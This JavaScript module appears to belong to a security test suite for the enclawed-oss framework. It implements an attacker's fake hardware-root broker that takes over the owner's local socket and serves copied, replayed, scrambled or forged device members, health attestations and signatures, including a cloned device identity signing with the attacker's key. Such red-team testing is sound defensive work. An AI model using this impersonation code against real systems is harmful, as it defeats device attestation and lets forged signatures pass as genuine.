// The attacker's stand-in for the machine's hardware-root owner (attacks 3, 4, 5; C2 only).
//
// It speaks only the host-side owner socket of the open-source framework (enclawed-oss
// hardware-root/broker: newline-delimited JSON requests "members", "health" and "sign"), the
// socket any same-user process can listen on once the genuine owner's socket is gone. It never
// speaks to a device: whatever device data it serves is either copied from the genuine owner
// (which any same-user client may ask) or made up by the attacker. Nothing here describes how a
// device answers; the payloads of a genuine answer are treated as opaque values.
import { generateKeyPairSync, randomBytes, sign } from "node:crypto";
import fs from "node:fs";
import net from "node:net";
import path from "node:path";

/** Ask an owner socket one request; resolves with the reply object (or rejects on timeout). */
export function ask(socketPath, req, timeoutMs = 10_000) {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection(socketPath);
    let buf = "";
    const t = setTimeout(() => {
      sock.destroy();
      reject(new Error("timeout"));
    }, timeoutMs);
    sock.on("connect", () => sock.write(`${JSON.stringify({ id: 1, ...req })}\n`));
    sock.on("data", (d) => {
      buf += d;
      const nl = buf.indexOf("\n");
      if (nl >= 0) {
        clearTimeout(t);
        sock.destroy();
        try {
          resolve(JSON.parse(buf.slice(0, nl)));
        } catch (e) {
          reject(e);
        }
      }
    });
    sock.on("error", (e) => {
      clearTimeout(t);
      reject(e);
    });
  });
}

/** What a same-user client can learn from the genuine owner before taking its socket over. */
export async function captureGenuine(socketPath, { replay = false } = {}) {
  const members = await ask(socketPath, { op: "members" });
  const out = { members: members?.ok ? members.members : null };
  if (replay) {
    // Answers to the attacker's own nonce and digest, kept to be replayed later.
    out.health = await ask(socketPath, { op: "health", nonce: randomBytes(32).toString("hex") }).catch(() => null);
    out.sign = await ask(socketPath, { op: "sign", digest: randomBytes(32).toString("hex") }, 30_000).catch(() => null);
  }
  return out;
}

const flip = (hex) => (typeof hex === "string" ? randomBytes(Math.max(1, hex.length / 2)).toString("hex") : hex);
/** A value of the same shape as `v` with every hex string replaced by random bytes of the same length. */
export function scramble(v) {
  if (typeof v === "string") {
    return /^[0-9a-f]+$/i.test(v) && v.length % 2 === 0 ? flip(v) : v;
  }
  if (Array.isArray(v)) {
    return v.map(scramble);
  }
  if (v && typeof v === "object") {
    return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, k === "uid" ? x : scramble(x)]));
  }
  return v;
}

/**
 * The service a variant offers.
 *   claims-clean  (3) the genuine members (copied), health always CLEAN, every device signature made up
 *   replay        (4) the genuine members, and the genuine answers captured earlier replayed verbatim
 *   uncertified   (5) a device identity of the attacker's own: its own key, a certificate nobody issued
 *   clone         (5) the genuine device's identity (uid, serial, certificate, public key), signing
 *                     with the attacker's own key (the genuine private key never leaves the device)
 */
export function fakeService(variant, captured) {
  const own = generateKeyPairSync("ed25519");
  const ownPub = own.publicKey.export({ format: "der", type: "spki" }).subarray(-32).toString("hex");
  const ownSign = (hexDigest) => sign(null, Buffer.from(hexDigest, "hex"), own.privateKey).toString("hex");
  const genuine = captured?.members ?? [];
  const members =
    variant === "uncertified"
      ? [{ uid: randomBytes(16).toString("hex"), pubkey: ownPub, serial: "ATTACKER-0001", cert: randomBytes(160).toString("hex") }]
      : genuine;
  const uid = members[0]?.uid ?? randomBytes(16).toString("hex");
  const clean = { status: "CLEAN" };
  return {
    members: () => members,
    health: (nonce) => {
      if (variant === "replay") {
        return captured?.health?.ok ? { health: captured.health.health ?? clean, ...(captured.health.att ? { att: captured.health.att } : {}) } : { health: clean };
      }
      if (variant === "claims-clean") {
        return { health: clean, ...(captured?.health?.att ? { att: scramble(captured.health.att) } : {}) };
      }
      // uncertified / clone: the attacker signs the client's nonce with its own key.
      return { health: clean, att: members.map((m) => ({ uid: m.uid, latch: ownSign(nonce ?? "00".repeat(32)) })) };
    },
    sign: (digest) => {
      if (variant === "replay" && captured?.sign?.ok) {
        return { uid: captured.sign.uid, sig: captured.sign.sig };
      }
      return { uid, sig: variant === "claims-clean" ? randomBytes(64).toString("hex") : ownSign(digest) };
    },
  };
}

/**
 * Listen on `socketPath` (the canonical owner socket, taken over) and answer with `svc`.
 * Every request is logged to `logFile` (operation names only). Resolves with { close }.
 */
export function startFakeBroker(socketPath, svc, logFile) {
  fs.mkdirSync(path.dirname(socketPath), { recursive: true, mode: 0o700 });
  fs.chmodSync(path.dirname(socketPath), 0o700);
  fs.rmSync(socketPath, { force: true });
  const log = (o) => fs.appendFileSync(logFile, `${JSON.stringify({ ts: new Date().toISOString(), ...o })}\n`);
  const server = net.createServer((sock) => {
    let buf = "";
    sock.on("error", () => {});
    sock.on("data", (d) => {
      buf += d;
      for (let nl = buf.indexOf("\n"); nl >= 0; nl = buf.indexOf("\n")) {
        const line = buf.slice(0, nl);
        buf = buf.slice(nl + 1);
        let req;
        try {
          req = JSON.parse(line);
        } catch {
          sock.destroy();
          return;
        }
        const reply = (o) => !sock.destroyed && sock.write(`${JSON.stringify({ id: req.id ?? null, ...o })}\n`);
        log({ op: String(req.op ?? "?") });
        if (req.op === "members") {
          reply({ ok: true, members: svc.members() });
        } else if (req.op === "health") {
          reply({ ok: true, ...svc.health(typeof req.nonce === "string" ? req.nonce : null) });
        } else if (req.op === "sign" && typeof req.digest === "string") {
          reply({ ok: true, ...svc.sign(req.digest) });
        } else {
          reply({ ok: false, error: "bad request" });
        }
      }
    });
  });
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(socketPath, () => {
      fs.chmodSync(socketPath, 0o600);
      resolve({ close: () => new Promise((r) => server.close(() => r())) });
    });
  });
}
